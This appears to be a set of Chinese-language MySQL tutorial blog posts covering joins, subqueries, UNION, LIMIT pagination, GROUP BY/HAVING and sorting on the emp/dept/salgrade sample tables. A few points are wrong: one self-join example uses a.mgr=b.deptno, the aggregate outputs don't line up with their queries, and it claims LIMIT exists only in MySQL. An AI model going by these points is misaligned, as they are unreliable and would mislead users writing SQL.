<p>mysql&gt; select e.ename,d.dname from emp e, dept d where e.deptno=d.deptno;<br>+——–+————+<br>| ename  | dname      |<br>+——–+————+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>+——–+————+<br>14 rows in set (0.00 sec)</p>
</blockquote>
<h2 id="内连接之等值连接"><a href="#内连接之等值连接" class="headerlink" title="内连接之等值连接"></a>内连接之等值连接</h2><p><strong>特点：条件是等量关系</strong></p>
<p>案例：查询每个员工的部门名称，要求显示员工名和部门名</p>
<blockquote>
<p><strong>SQL92:(太老，不用了)</strong><br>select e.ename, d.dname from emp e, dept d where e.deptno = d.deptno;</p>
</blockquote>
<blockquote>
<p><strong>SQL99:(常用的)</strong><br>select<br>e.ename, d.dname<br>from<br>emp e<br>join<br>dept d<br><strong>on **<br>**e.deptno = d.deptno;    //等值连接</strong></p>
<p>select<br>e.ename, d.dname<br>from<br>emp e<br>inner join   // inner可省略<br>dept d<br><strong>on **<br>**e.deptno = d.deptno;    //等值连接</strong></p>
</blockquote>
<p>SQL99语法结构更清晰一些：表的连接条件和后来的where条件分离了</p>
<h2 id="内连接之非等值连接"><a href="#内连接之非等值连接" class="headerlink" title="内连接之非等值连接"></a>内连接之非等值连接</h2><p><strong>最大的特点是：连接条件中的关系是非等量关系。</strong></p>
<blockquote>
<p>案例：找出每个员工的工资等级，要求显示员工名、工资、工资等级。<br>select<br>e.ename, e.sal, s.grade<br>from<br>emp e<br>join salgrade s<br>on<br>e.sal&gt;=losal and e.sal&lt;=hisal;</p>
<p>+——–+———+——-+<br>| ename  | sal     | grade |<br>+——–+———+——-+<br>| SMITH  |  800.00 |     1 |<br>| ALLEN  | 1600.00 |     3 |<br>| WARD   | 1250.00 |     2 |<br>| JONES  | 2975.00 |     4 |<br>| MARTIN | 1250.00 |     2 |<br>| BLAKE  | 2850.00 |     4 |<br>| CLARK  | 2450.00 |     4 |<br>| SCOTT  | 3000.00 |     4 |<br>| KING   | 5000.00 |     5 |<br>| TURNER | 1500.00 |     3 |<br>| ADAMS  | 1100.00 |     1 |<br>| JAMES  |  950.00 |     1 |<br>| FORD   | 3000.00 |     4 |<br>| MILLER | 1300.00 |     2 |<br>+——–+———+——-+<br>14 rows in set (0.00 sec)</p>
</blockquote>
<h2 id="内连接之自连接"><a href="#内连接之自连接" class="headerlink" title="内连接之自连接"></a>内连接之自连接</h2><p><strong>最大的特点：一张表看做两张表。自己连接自己。</strong></p>
<p><strong>案例:找出每个员工的上级领导，要求显示员工名和对应的领导名。</strong></p>
<blockquote>
<p>select<br>  a.ename, b.ename<br>from<br>  emp a<br>inner join<br>  emp b<br>on<br>  a.mgr=b.deptno; </p>
</blockquote>
<h2 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h2><p>什么是外连接，和内连接有什么区别？<br>　　内连接：假设A和B表进行连接，使用内连接的话，凡是A表和B表能够匹配上的记录查询出来，这就是内连接。<br>AB两张表没有主副之分，两张表是平等的。</p>
<p>　　外连接：假设A和B表进行连接，使用外连接的话，AB两张表中有一张表是主表，一张表是副表，主要查询主表中的数据，捎带着查询副表，当副表中的数据没有和主表中的数据匹配上，副表自动模拟出NULL与之匹配。</p>
<p>　　外连接的分类？</p>
<p>左外连接（左连接）：表示左边的这张表是主表。<br>右外连接（右连接）：表示右边的这张表是主表。</p>
<p>　　左连接有有连接的写法，右连接也会有对应左连接的写法    </p>
<p><strong>案例：找出每个员工的上级领导？</strong>（所有员工必须全部查询出来）</p>
<blockquote>
<p>//inner可以省略</p>
<p><strong>内连接</strong><br><strong>select a.ename, b.ename from emp a inner join emp b on a.mgr=b.empno;</strong></p>
<p>//outer可以省略</p>
<p><strong>外连接（左连接）</strong><br><strong>select a.ename, b.ename from emp a left outer join emp b on a.mgr=b.empno;</strong></p>
<p><strong>外连接（右连接）</strong></p>
<p><strong>select a.ename, b.ename from emp b right outer join emp a on a.mgr=b.empno;</strong></p>
</blockquote>
<p><strong>外连接重要的特点是：主表的数据无条件的全部查询出来</strong></p>
<p><strong>案例：找出那个部门没有员工？</strong></p>
<blockquote>
<p>mysql&gt; <strong>select d.* from emp e right join dept d on e.deptno=d.deptno where e.empno is null;</strong><br>+——–+————+——–+<br>| DEPTNO | DNAME      | LOC    |<br>+——–+————+——–+<br>|     40 | OPERATIONS | BOSTON |<br>+——–+————+——–+<br>1 row in set (0.00 sec)</p>
</blockquote>
<h2 id="三张表怎么连接查询？"><a href="#三张表怎么连接查询？" class="headerlink" title="三张表怎么连接查询？"></a>三张表怎么连接查询？</h2><p>案例：找出每一个员工的部门名称以及工资等级</p>
<blockquote>
<p>//全部员工<br>select * from emp;<br>//部门名称<br>select e.ename, d.dname from emp e join dept d on e.deptno=d.deptno;<br>//工资等级<br>select e.ename, s.grade from emp e join salgrade s on e.sal between losal and hisal;<br>//最终结合<br>select e.ename, d.dname, s.grade from emp e join dept d on  e.deptno=d.deptno join salgrade s on e.sal between losal and hisal;</p>
</blockquote>
<p><strong>案例：找出每个员工的部门名称、工资等级、以及上级领导。</strong></p>
<blockquote>
<p>select e.ename, d.dname, s.grade,b.ename from emp e join dept d on  e.deptno=d.deptno join salgrade s on e.sal between losal and hisal join emp b on e.mgr=b.empno;</p>
</blockquote>
<h1 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h1><h2 id="什么是子查询？子查询都可以出现在哪里？"><a href="#什么是子查询？子查询都可以出现在哪里？" class="headerlink" title="什么是子查询？子查询都可以出现在哪里？"></a><strong>什么是子查询？子查询都可以出现在哪里？</strong></h2><p>　<strong>select 语句当中嵌套select语句，被嵌套的select语句是子查询</strong></p>
<p>　<strong>子查询可以出现在哪里?</strong></p>
<p>　<strong>select</strong><br>　　<strong>..(select)</strong></p>
<p>　<strong>from</strong><br>　　<strong>..(select)</strong></p>
<p>　<strong>where</strong></p>
<p>　　<strong>..(select)</strong></p>
<h2 id="where子句中使用子查询"><a href="#where子句中使用子查询" class="headerlink" title="where子句中使用子查询"></a>where子句中使用子查询</h2><p><strong>案例：找出高于平均薪资的员工信息。</strong></p>
<blockquote>
<p>select * from emp where sal &gt; (select avg(sal) from emp);</p>
</blockquote>
<h2 id="From后面嵌套子查询"><a href="#From后面嵌套子查询" class="headerlink" title="From后面嵌套子查询"></a>From后面嵌套子查询</h2><p><strong>案例：找出每个部门平均薪水的薪资等级</strong></p>
<blockquote>
<p><strong>First Step:</strong><br><strong>select avg(sal) avg, deptno from emp group by deptno;</strong></p>
<p>+————-+——–+<br>| avg         | deptno |<br>+————-+——–+<br>| 2916.666667 |     10 |<br>| 2175.000000 |     20 |<br>| 1566.666667 |     30 |<br>+————-+——–+<br>3 rows in set (0.00 sec)</p>
<p><strong>Second Step:</strong><br><strong>select n.avg, n.deptno, s.grade from (select avg(sal) avg, deptno from emp group by deptno) n join salgrade s on n.avg between losal and hisal;</strong></p>
<p>+————-+——–+——-+<br>| avg         | deptno | grade |<br>+————-+——–+——-+<br>| 2916.666667 |     10 |     4 |<br>| 2175.000000 |     20 |     4 |<br>| 1566.666667 |     30 |     3 |<br>+————-+——–+——-+<br>3 rows in set (0.01 sec)</p>
</blockquote>
<p>案例：找出每个部门平均的薪水等级 </p>
<blockquote>
<p><strong>First Step:</strong><br><strong>select e.deptno, s.grade from emp e join salgrade s on e.sal between losal and hisal;</strong></p>
<p>+——–+——-+<br>| deptno | grade |<br>+——–+——-+<br>|     20 |     1 |<br>|     30 |     3 |<br>|     30 |     2 |<br>|     20 |     4 |<br>|     30 |     2 |<br>|     30 |     4 |<br>|     10 |     4 |<br>|     20 |     4 |<br>|     10 |     5 |<br>|     30 |     3 |<br>|     20 |     1 |<br>|     30 |     1 |<br>|     20 |     4 |<br>|     10 |     2 |<br>+——–+——-+<br>14 rows in set (0.00 sec)</p>
<p><strong>Second Step:</strong><br><strong>select s.deptno, avg(s.grade) avg from (select e.deptno, s.grade from emp e join salgrade s on e.sal between losal and hisal) s group by s.deptno;</strong><br>+——–+——–+<br>| deptno | avg    |<br>+——–+——–+<br>|     10 | 3.6667 |<br>|     20 | 2.8000 |<br>|     30 | 2.5000 |<br>+——–+——–+<br>3 rows in set (0.00 sec)</p>
</blockquote>
<h2 id="在select后面嵌套子查询"><a href="#在select后面嵌套子查询" class="headerlink" title="在select后面嵌套子查询"></a>在select后面嵌套子查询</h2><p><strong>案例：找出每个员工所在的部门名称，要求显示员工名和部门名。</strong></p>
<blockquote>
<p><strong>select e.ename, (select d.dname from dept d where e.deptno=d.deptno) dname from emp e;</strong><br>+——–+————+<br>| ename  | dname      |<br>+——–+————+<br>| SMITH  | RESEARCH   |<br>| ALLEN  | SALES      |<br>| WARD   | SALES      |<br>| JONES  | RESEARCH   |<br>| MARTIN | SALES      |<br>| BLAKE  | SALES      |<br>| CLARK  | ACCOUNTING |<br>| SCOTT  | RESEARCH   |<br>| KING   | ACCOUNTING |<br>| TURNER | SALES      |<br>| ADAMS  | RESEARCH   |<br>| JAMES  | SALES      |<br>| FORD   | RESEARCH   |<br>| MILLER | ACCOUNTING |<br>+——–+————+</p>
</blockquote>
<h1 id="union-可以将查询结果集相加"><a href="#union-可以将查询结果集相加" class="headerlink" title="union(可以将查询结果集相加)"></a>union(可以将查询结果集相加)</h1><p><strong>案例：找出工作岗位是SALESMAN和MANAGER的员工</strong></p>
<blockquote>
<p><strong>mysql&gt; select * from emp where job=’salesman’ or job=’manager’;</strong><br>+——-+——–+———-+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB      | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———-+——+————+———+———+——–+<br>|  7499 | ALLEN  | SALESMAN | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER  | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER  | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER  | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |</p>
</blockquote>
<blockquote>
<p><strong>First Step:</strong></p>
<p>select * from emp where job=’salesman’ or job=’manager’;</p>
<p><strong>Second Step:</strong><br>select * from emp where job in(‘salesman’ ,’manager’) ;</p>
<p><strong>Third Step: union</strong><br> select * from emp where job=’salesman’<br> union<br> select * from emp where job=’manager’;</p>
<p>+——-+——–+———-+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB      | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———-+——+————+———+———+——–+<br>|  7499 | ALLEN  | SALESMAN | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7654 | MARTIN | SALESMAN | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7844 | TURNER | SALESMAN | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7566 | JONES  | MANAGER  | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7698 | BLAKE  | MANAGER  | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER  | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>+——-+——–+———-+——+————+———+———+——–+</p>
</blockquote>
<p>两张不相干的表中的数据拼接在一起显示？<br>select ename from emp<br> union<br> select dname from dept;</p>
<blockquote>
<p>mysql&gt; select ename from emp  union select dname from dept;<br>+————+<br>| ename      |<br>+————+<br>| SMITH      |<br>| ALLEN      |<br>| WARD       |<br>| JONES      |<br>| MARTIN     |<br>| BLAKE      |<br>| CLARK      |<br>| SCOTT      |<br>| KING       |<br>| TURNER     |<br>| ADAMS      |<br>| JAMES      |<br>| FORD       |<br>| MILLER     |<br>| ACCOUNTING |<br>| RESEARCH   |<br>| SALES      |<br>| OPERATIONS |<br>+————+</p>
</blockquote>
<h1 id="Limit-重点中的重点"><a href="#Limit-重点中的重点" class="headerlink" title="Limit(重点中的重点)"></a>Limit(重点中的重点)</h1><p><strong>特点：以后分页查询全靠它</strong></p>
<p><strong>Limit是mysql特有的，其他数据库中没有，不通用（oracle有一个相同的机制，叫做rownum）.</strong></p>
<p><strong>limit取结果几种的部分数据，这时它的作用。</strong></p>
<blockquote>
<p><strong>语法机制：</strong></p>
<p>　　 <strong>limit startIndex, length</strong></p>
<p>　　<strong>startIndex表示起始位置</strong></p>
<p>　　<strong>length表示取几个</strong></p>
</blockquote>
<p><strong>案例：取出工资前五名的员工（思路：降序取前5个）</strong></p>
<blockquote>
<p><strong>mysql&gt; select ename,sal from emp order by sal desc limit 0,5;</strong><br>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>| SCOTT | 3000.00 |<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>+——-+———+<br>5 rows in set (0.00 sec)</p>
<p><strong>mysql&gt; select ename,sal from emp order by sal desc limit 5;</strong><br>+——-+———+<br>| ename | sal     |<br>+——-+———+<br>| KING  | 5000.00 |<br>| FORD  | 3000.00 |<br>| SCOTT | 3000.00 |<br>| JONES | 2975.00 |<br>| BLAKE | 2850.00 |<br>+——-+———+</p>
</blockquote>
<p><strong>limit是sql语句最后执行的一个环节</strong>：</p>
<p>select   5<br>from  1<br>where  2<br>group by   3<br>having    4<br>order by   6<br>limit   7</p>
<p>案例：找出工资排名在第4到第9名的员工？</p>
<blockquote>
<p>select ename,sal from emp order by sal desc limit 3,6;</p>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| JONES  | 2975.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |</p>
</blockquote>
<p><strong>通用的标准分页sql?</strong></p>
<p>每页显示3条记录：<br>第一页： 0, 3<br>第二页： 3, 3<br>第三页： 6, 3</p>
<p><strong>每页显示pagesize条记录：</strong><br><strong>第pageNo页： pageSize*(pageNO-1)， pagesize</strong></p>
<p>pageSize是什么？是每页显示多少条记录<br>pageNo是什么？显示第几页</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">java代码&#123;</span><br><span class="line"></span><br><span class="line">​		int pageNo &#x3D; 2; &#x2F;&#x2F;</span><br><span class="line">​        int page size &#x3D; 10;</span><br><span class="line">​      limit (pageNo - 1)*pagesize , pagesize</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>分组查询 Group By</title>
    <url>/posts/10.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="group-by-和-having"><a href="#group-by-和-having" class="headerlink" title="group by 和 having"></a>group by 和 having</h1><p><strong>group by</strong> ：按照某个字段或者某些字段进行分组。<br><strong>having</strong> ：是对分组之后的数据进行再次过滤。</p>
<p>案例：找出每个工作岗位的最高薪资。<br>select max(sal),job from emp group by job;</p>
<p><strong>注意</strong>：分组函数一般都会和group by 联合使用，这也是为什么它被称作分组函数的原因，并且任何一个分组函数（count sum avg max min）都是在group by 语句执行结束之后才会执行。当一条sql语句没有group by 的话。整张表的数据会自成一组。（group by 是在where执行之后才会执行的。）</p>
<p>找出工资高于平均工资的员工。<br> select ename,sal from emp where sal&gt;(select avg(sal) from emp);</p>
<p> select ename,max(sal),job from emp group by job;<br>以上在mysql当中，查询结果是有的，但是结果没有意义。在oracle数据库中会报语法错误。oracle的语法规则比mysql语法规则严谨。<br>记住一个规则当一条语句中有group by的话，select后面只能跟分组函数和参与分组的字段。</p>
<p><strong>每个工作岗位的平均薪资</strong></p>
<p>select avg(sal),job from emp group by job;</p>
<p>+————-+———–+<br>| avg(sal)    | job       |<br>+————-+———–+<br>| 3000.000000 | ANALYST   |<br>| 1037.500000 | CLERK     |<br>| 2758.333333 | MANAGER   |<br>| 5000.000000 | PRESIDENT |<br>| 1400.000000 | SALESMAN  |</p>
<p>多个字段能不能联合起来一块分组？</p>
<p><strong>找出每个部门不同工作岗位的最高薪资。</strong><br>select<br>    deptno,job,max(sal)<br>from<br>    emp<br>group by<br>    deptno,job;</p>
<p>+——–+———–+———-+<br>| deptno | job       | max(sal) |<br>+——–+———–+———-+<br>|     10 | CLERK     |  1300.00 |<br>|     10 | MANAGER   |  2450.00 |<br>|     10 | PRESIDENT |  5000.00 |<br>|     20 | ANALYST   |  3000.00 |<br>|     20 | CLERK     |  1100.00 |<br>|     20 | MANAGER   |  2975.00 |<br>|     30 | CLERK     |   950.00 |<br>|     30 | MANAGER   |  2850.00 |<br>|     30 | SALESMAN  |  1600.00 |<br>+——–+———–+———-+<br>9 rows in set (0.00 sec)</p>
<p><strong>找出每个部门的最高薪资，要求显示薪资大于2900的数据。</strong><br>第一步：每个部门的最高薪资<br>select deptno,max(sal) from emp group by deptno;</p>
<p>+——–+———-+<br>| deptno | max(sal) |<br>+——–+———-+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>|     30 |  2850.00 |</p>
<p>第二步：薪资大于2900的数据<br>select * from emp where sal&gt;2900;</p>
<p>+——-+——-+———–+——+————+———+——+——–+<br>| EMPNO | ENAME | JOB       | MGR  | HIREDATE   | SAL     | COMM | DEPTNO |<br>+——-+——-+———–+——+————+———+——+——–+<br>|  7566 | JONES | MANAGER   | 7839 | 1981-04-02 | 2975.00 | NULL |     20 |<br>|  7698 | BLAKE | MANAGER   | 7839 | 1981-05-01 | 2850.00 | NULL |     30 |<br>|  7788 | SCOTT | ANALYST   | 7566 | 1987-04-19 | 3000.00 | NULL |     20 |<br>|  7839 | KING  | PRESIDENT | NULL | 1981-11-17 | 5000.00 | NULL |     10 |<br>|  7902 | FORD  | ANALYST   | 7566 | 1981-12-03 | 3000.00 | NULL |     20 |<br>+——-+——-+———–+——+————+———+——+——–+</p>
<p><strong>最后合并</strong></p>
<p>select deptno,max(sal) from emp where sal&gt;2900 group by deptno;</p>
<p>+——–+———-+<br>| deptno | max(sal) |<br>+——–+———-+<br>|     10 |  5000.00 |<br>|     20 |  3000.00 |<br>+——–+———-+<br>2 rows in set (0.00 sec)</p>
<p><strong>找出每个部门的平均薪资，要求显示薪资大于2000的数据。</strong><br>第一步：<br>select deptno,avg(sal) 平均薪资 from emp group by deptno;</p>
<p>+——–+————-+<br>| deptno | 平均薪资    |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>|     30 | 1566.666667 |</p>
<p>第二步：<br>select deptno,avg(sal) 平均薪资 from emp group by deptno having 平均薪资&gt;2000;</p>
<p>+——–+————-+<br>| deptno | 平均薪资    |<br>+——–+————-+<br>|     10 | 2916.666667 |<br>|     20 | 2175.000000 |<br>+——–+————-+</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>一个完整的DQL语句怎么写?</p>
<p>select 5<br>    ··<br>from 1<br>    ··<br>where 2<br>    ··<br>group by 3<br>    ··<br>having 4<br>    ··<br>order by 6<br>    ··</p>
]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>知识拓展</tag>
      </tags>
  </entry>
  <entry>
    <title>MySql表的结构</title>
    <url>/posts/9.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="表的结构"><a href="#表的结构" class="headerlink" title="表的结构"></a>表的结构</h1><blockquote>
<p>+——————-+<br>| Tables_in_dongjun |<br>+——————-+<br>| dept              |   （部门表）<br>| emp               |   （员工表）<br>| salgrade          |   （工资等级表）</p>
</blockquote>
<blockquote>
<p>表的结构mysql&gt; desc dept;<br>+——–+————-+——+—–+———+——-+<br>| Field  | Type        | Null | Key | Default | Extra |<br>+——–+————-+——+—–+———+——-+<br>| DEPTNO | int(2)      | NO   | PRI | NULL    |       |<br>| DNAME  | varchar(14) | YES  |     | NULL    |       |<br>| LOC    | varchar(13) | YES  |     | NULL    |       |<br>+——–+————-+——+—–+———+——-+</p>
</blockquote>
<p>表中的数据</p>
<blockquote>
<p>mysql&gt; select * from emp;<br>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<h1 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h1><p>（略）</p>
<h1 id="排序（升序、降序）"><a href="#排序（升序、降序）" class="headerlink" title="排序（升序、降序）"></a>排序（升序、降序）</h1><p>题目：按照工资升序排序，找出员工名和薪资。<br>select ename, sal from emp order by sal;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |</p>
</blockquote>
<p><strong>注意：默认是升序asc表示升序、desc表示降序</strong>  </p>
<p>select ename, sal from emp order by sal;<br>select ename, sal from emp order by sal asc; 指定升序<br>select ename, sal from emp order by sal desc; 指定降序</p>
<p>题目：按照工资的降序排列，当工资相同的时候再按照名字的升序排列。</p>
<p>select ename,sal from emp order by sal desc , ename asc;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| KING   | 5000.00 |<br>| FORD   | 3000.00 |<br>| SCOTT  | 3000.00 |<br>| JONES  | 2975.00 |<br>| BLAKE  | 2850.00 |<br>| CLARK  | 2450.00 |<br>| ALLEN  | 1600.00 |<br>| TURNER | 1500.00 |<br>| MILLER | 1300.00 |<br>| MARTIN | 1250.00 |<br>| WARD   | 1250.00 |<br>| ADAMS  | 1100.00 |<br>| JAMES  |  950.00 |<br>| SMITH  |  800.00 |<br>+——–+———+</p>
</blockquote>
<p><strong>注意</strong>：越靠前的字段越能起到主导作用。只有当前面的字段无法完成排序的时候后，才会启用后面的字段。</p>
<p>select ename, sal from emp order by 2;</p>
<blockquote>
<p>+——–+———+<br>| ename  | sal     |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
<p><strong>注意：</strong>“2”代表的是第几列。</p>
<p><strong>select * from emp order by 6;</strong></p>
<p>+——-+——–+———–+——+————+———+———+——–+<br>| EMPNO | ENAME  | JOB       | MGR  | HIREDATE   | SAL     | COMM    | DEPTNO |<br>+——-+——–+———–+——+————+———+———+——–+<br>|  7369 | SMITH  | CLERK     | 7902 | 1980-12-17 |  800.00 |    NULL |     20 |<br>|  7900 | JAMES  | CLERK     | 7698 | 1981-12-03 |  950.00 |    NULL |     30 |<br>|  7876 | ADAMS  | CLERK     | 7788 | 1987-05-23 | 1100.00 |    NULL |     20 |<br>|  7521 | WARD   | SALESMAN  | 7698 | 1981-02-22 | 1250.00 |  500.00 |     30 |<br>|  7654 | MARTIN | SALESMAN  | 7698 | 1981-09-28 | 1250.00 | 1400.00 |     30 |<br>|  7934 | MILLER | CLERK     | 7782 | 1982-01-23 | 1300.00 |    NULL |     10 |<br>|  7844 | TURNER | SALESMAN  | 7698 | 1981-09-08 | 1500.00 |    0.00 |     30 |<br>|  7499 | ALLEN  | SALESMAN  | 7698 | 1981-02-20 | 1600.00 |  300.00 |     30 |<br>|  7782 | CLARK  | MANAGER   | 7839 | 1981-06-09 | 2450.00 |    NULL |     10 |<br>|  7698 | BLAKE  | MANAGER   | 7839 | 1981-05-01 | 2850.00 |    NULL |     30 |<br>|  7566 | JONES  | MANAGER   | 7839 | 1981-04-02 | 2975.00 |    NULL |     20 |<br>|  7788 | SCOTT  | ANALYST   | 7566 | 1987-04-19 | 3000.00 |    NULL |     20 |<br>|  7902 | FORD   | ANALYST   | 7566 | 1981-12-03 | 3000.00 |    NULL |     20 |<br>|  7839 | KING   | PRESIDENT | NULL | 1981-11-17 | 5000.00 |    NULL |     10 |<br>+——-+——–+———–+——+————+———+———+——–+</p>
</blockquote>
<p><strong>建议写成</strong></p>
<p><strong>select * from emp order by sal;</strong></p>
<p>题目：找出工作岗位是salesman的员工，并且要求按照薪资的降序排列。</p>
<p><strong>select ename, sal, job from emp where job = ‘salesman’ order by sal desc;</strong></p>
<blockquote>
<p>+——–+———+———-+<br>| ename  | sal     | job      |<br>+——–+———+———-+<br>| ALLEN  | 1600.00 | SALESMAN |<br>| TURNER | 1500.00 | SALESMAN |<br>| WARD   | 1250.00 | SALESMAN |<br>| MARTIN | 1250.00 | SALESMAN |</p>
</blockquote>
<p><strong>语句格式与执行顺序</strong></p>
<blockquote>
<p>select</p>
<p>​    *     3</p>
<p>from  </p>
<p>​    tablename     1</p>
<p>where</p>
<p>​    条件      2</p>
<p>order by      4</p>
<p>​    ……</p>
</blockquote>
<p>order by 是最后执行的</p>
<p><strong>select ename,sal as salary from emp order by salary;</strong></p>
<blockquote>
<p>+——–+———+<br>| ename  | salary  |<br>+——–+———+<br>| SMITH  |  800.00 |<br>| JAMES  |  950.00 |<br>| ADAMS  | 1100.00 |<br>| WARD   | 1250.00 |<br>| MARTIN | 1250.00 |<br>| MILLER | 1300.00 |<br>| TURNER | 1500.00 |<br>| ALLEN  | 1600.00 |<br>| CLARK  | 2450.00 |<br>| BLAKE  | 2850.00 |<br>| JONES  | 2975.00 |<br>| SCOTT  | 3000.00 |<br>| FORD   | 3000.00 |<br>| KING   | 5000.00 |<br>+——–+———+</p>
</blockquote>
<h1 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a><strong>分组函数</strong></h1><p>count 计数<br>sum 求和<br>avg 平均值<br>max 最大值<br>min 最小值</p>
<p>记住：所有分组的函数都是对“某一组”数据进行操作的。</p>
<p>题目：找出员工工资总和</p>
<p>select sum(sal) sal from emp;<br>select max(sal) sal from emp;<br>select min(sal) sal from emp;<br>select avg(sal) sal from emp;<br>select count(ename) ename from emp;</p>
<blockquote>
<p>+———+<br>| sal     |<br>+———+<br>| 5000.00 |<br>+———+<br>1 row in set (0.01 sec)</p>
<p>+——–+<br>| sal    |<br>+——–+<br>| 800.00 |<br>+——–+<br>1 row in set (0.00 sec)</p>
<p>+————-+<br>| sal         |<br>+————-+<br>| 2073.214286 |<br>+————-+<br>1 row in set (0.00 sec)</p>
<p>+——-+<br>| ename |<br>+——-+<br>|    14 |<br>+——-+</p>
</blockquote>
